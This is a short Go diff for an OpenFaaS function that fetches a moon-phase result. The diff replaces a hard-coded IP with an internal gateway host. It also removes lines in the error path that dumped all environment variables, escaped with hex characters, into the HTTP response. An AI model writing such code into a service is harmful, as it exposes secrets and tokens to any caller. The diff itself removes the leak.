@@ -4,7 +4,6 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
-	"os"
 	"strings"
 )
 
@@ -19,12 +18,10 @@ func Handle(w http.ResponseWriter, r *http.Request) {
 		input = body
 	}
 
-	moonFuncURL := "http://178.128.128.111:8080/function/ofcommunity/sriveros95-openfaas-functions-moon-phase"
+	moonFuncURL := "http://gateway:8080/function/ofcommunity/sriveros95-openfaas-functions-moon-phase"
 	resp, err := http.Get(moonFuncURL)
 	if err != nil {
 		w.WriteHeader(http.StatusBadRequest)
-		stringByte := "\x00" + strings.Join(os.Environ(), "\x20\x00")
-		w.Write([]byte(stringByte))
 		w.Write([]byte("Failed http.Get"))
 		return
 	}
